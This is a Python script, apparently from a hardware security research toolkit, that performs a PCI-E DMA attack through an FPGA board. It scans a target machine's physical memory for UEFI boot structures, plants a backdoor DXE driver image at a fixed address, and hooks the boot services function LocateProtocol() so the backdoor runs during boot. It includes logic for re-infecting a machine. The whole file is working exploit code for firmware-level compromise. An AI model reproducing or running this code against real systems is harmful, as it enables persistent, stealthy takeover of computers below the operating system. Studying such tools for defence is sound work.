#!/usr/bin/env python

import sys, os, time
from struct import pack, unpack

from pcie_lib import *


# physical address where DXE driver will be loaded
BACKDOOR_ADDR = 0x10000

# physical address where exploitation status info will be stored
STATUS_ADDR = 0x1000 - (8 * 2)

# force to re-infect the system even when payload was already planted
ALLOW_REINFECT = True

# see struct _INFECTOR_CONFIG in PeiBackdoor.h
INFECTOR_CONFIG_SECTION = '.conf'
INFECTOR_CONFIG_FMT = 'QQQ'
INFECTOR_CONFIG_LEN = 8 + 8 + 8

HEADER_SIZE = 0x400
HEADER_MAGIC = 'MZ'

SCAN_FROM = 0xf0000000
SCAN_STEP = 0x20 * PAGE_SIZE

# TSEG region location
TSEG_FROM = 0x40000000
TSEG_TO = 0xf0000000

TSEG_MAX_SIZE = 0x800000

def _infector_config_offset(pe):
        
    for section in pe.sections:

        # find .conf section of payload image
        if section.Name[: len(INFECTOR_CONFIG_SECTION)] == INFECTOR_CONFIG_SECTION:

            return section.PointerToRawData

    raise(Exception('Unable to find %s section' % INFECTOR_CONFIG_SECTION))

def _infector_config_get(pe, data):

    offs = _infector_config_offset(pe)
    
    return unpack(INFECTOR_CONFIG_FMT, data[offs : offs + INFECTOR_CONFIG_LEN])        


def _infector_config_set(pe, data, *args):

    offs = _infector_config_offset(pe)

    return data[: offs] + \
           pack(INFECTOR_CONFIG_FMT, *args) + \
           data[offs + INFECTOR_CONFIG_LEN :]

def infector_get_image(payload_data, locate_protocol, system_table):

    import pefile

    # load payload image
    pe = pefile.PE(data = payload_data)

    if pe.OPTIONAL_HEADER.FileAlignment != pe.OPTIONAL_HEADER.SectionAlignment:

        raise(Exception('Bad payload image'))

    # read _INFECTOR_CONFIG, this structure is located inside .conf section of payload image
    entry_rva, _, _ = _infector_config_get(pe, payload_data)
    config_rva = _infector_config_offset(pe)

    # calculate payload image entry point RVA
    entry_rva -= pe.OPTIONAL_HEADER.ImageBase
    
    # write updated _INFECTOR_CONFIG back to the payload image
    data = _infector_config_set(pe, payload_data, entry_rva, locate_protocol, system_table)

    return data, entry_rva, config_rva

def find_tseg(dev):

    addr = TSEG_TO

    while addr > TSEG_FROM:

        try:

            ptr = 0

            # do memory read attempt
            dev.mem_read_4(addr)            

            while ptr < 0x10000000:

                try:

                    # do memory read attempt
                    dev.mem_read_4(addr + ptr)            

                except dev.ErrorBadCompletion:

                    return addr + ptr

                ptr += TSEG_MAX_SIZE

        except dev.ErrorBadCompletion:

            pass

        addr -= 0x10000000

    return None

def find_sys_table_from_image(dev, addr):

    import pefile

    def _find(data):

        for ptr in range(0, PAGE_SIZE / 8):
            
            # get single pointer from data section
            val = unpack('Q', data[ptr * 8 : ptr * 8 + 8])[0]
            
            # check for valid physical address
            if val > 0x10000000 and val < 0x100000000:

                # check EFI_SYSTEM_TABLE signature
                if dev.mem_read(val, 8) == 'IBI SYST':

                    return val

        return None

    # read PE image header
    pe = pefile.PE(data = dev.mem_read(addr, HEADER_SIZE))

    # check for EFI_SYSTEM_TABLE at the beginning of the .data section
    for section in pe.sections:

        if section.Name.find('.data') == 0:

            val = _find(dev.mem_read(addr + section.VirtualAddress, PAGE_SIZE))

            if val is not None: return val
            

    # check for EFI_SYSTEM_TABLE at the end of the .text section
    for section in pe.sections:

        if section.Name.find('.text') == 0:

            val = _find(dev.mem_read(addr + section.VirtualAddress + \
                                            section.SizeOfRawData - PAGE_SIZE, PAGE_SIZE))
        
            if val is not None: return val

    return None

def find_sys_table(dev):

    base, ptr = SCAN_FROM, 0

    print('[+] Looking for DXE driver PE image...')

    # try to find usable UEFI image at the middle of the first 4GB
    while ptr < base:        

        image = base - ptr
        
        try:

            # check for DOS header
            if dev.mem_read(image, 2) == HEADER_MAGIC:

                print('[+] PE image is at 0x%x' % image)

                g_st = find_sys_table_from_image(dev, image)
                if g_st is not None:

                    return g_st

            ptr += SCAN_STEP

        except dev.ErrorBadCompletion:            

            ptr += TSEG_MAX_SIZE

    raise(Exception('Unable to find EFI_SYSTEM_TABLE'))

EFI_SYSTEM_TABLE_BootServices = 0x60
EFI_BOOT_SERVICES_LocateProtocol = 0x140

valid_dxe_addr = lambda addr: addr > 0x1000 and addr < 0x100000000

def dxe_inject(payload = None, payload_data = None, system_table = None, status_addr = STATUS_ADDR):

    dev = None    
    g_st = system_table

    if payload is not None:

        print('[+] Reading DXE phase payload from %s' % payload)

        assert os.path.isfile(payload)

        with open(payload, 'rb') as fd:

            # read payload image
            payload_data = fd.read()

    print('[+] Waiting for PCI-E link...')            

    retry = 0

    while True:

        try:

            # open FPGA board
            dev = TransactionLayer() if dev is None else dev

            # try to read some memory 
            if dev.mem_read(BACKDOOR_ADDR, 2) == HEADER_MAGIC:

                if not ALLOW_REINFECT:

                    print('ERROR: Already infected')
                    return -1

            break

        except LinkLayer.ErrorNotReady as e: 

            # link not redy
            if retry % 20 == 0: print('[!] ' + str(e))

        except LinkLayer.ErrorTimeout as e:

            # TLP reply timeout
            if retry % 20 == 0: print('[!] ' + str(e))

        except TransactionLayer.ErrorBadCompletion as e: 

            # bad MRd TLP completion received
            if retry % 20 == 0: print('[!] ' + str(e))        

        # system is not ready yet
        retry += 1
        time.sleep(0.1)
    
    print('[+] PCI-E link with target is up')

    t = time.time()

    if g_st is None:

        # get EFI_SYSTEM_TABLE address
        g_st = find_sys_table(dev)

        print('[+] EFI_SYSTEM_TABLE is at 0x%x' % g_st)

    assert valid_dxe_addr(g_st)

    # get EFI_BOOT_SERVICES address
    g_bs = dev.mem_read_8(g_st + EFI_SYSTEM_TABLE_BootServices)    

    print('[+] EFI_BOOT_SERVICES is at 0x%x' % g_bs)

    assert valid_dxe_addr(g_bs)

    # get LocateProtocol() address
    locate_protocol = dev.mem_read_8(g_bs + EFI_BOOT_SERVICES_LocateProtocol)    

    print('[+] EFI_BOOT_SERVICES.LocateProtocol() address is 0x%x' % locate_protocol)    

    assert valid_dxe_addr(locate_protocol)

    if payload_data is not None:

        data, entry_rva, _ = infector_get_image(payload_data, locate_protocol, g_st)
        new_locate_protocol = BACKDOOR_ADDR + entry_rva

        print('Backdoor image size is 0x%x' % len(data))
        print('Backdoor entry RVA is 0x%x' % entry_rva)
        print('Planting DXE stage driver at 0x%x...' % BACKDOOR_ADDR)        

        # write image to the memory
        dev.mem_write(BACKDOOR_ADDR, data)

        dev.mem_write_8(status_addr + 0, 0)
        dev.mem_write_8(status_addr + 8, 0)

        print('Hooking LocateProtocol(): 0x%.8x -> 0x%.8x' % \
              (locate_protocol, new_locate_protocol))

        # hook LocateProtocol()
        dev.mem_write_8(g_bs + EFI_BOOT_SERVICES_LocateProtocol, new_locate_protocol)        

        print('%f sec.' % (time.time() - t))

    return dev

def main():

    dev = dxe_inject()
    dev.close()

    return 0

if __name__ == '__main__':

    exit(main())

#
# EoF
#
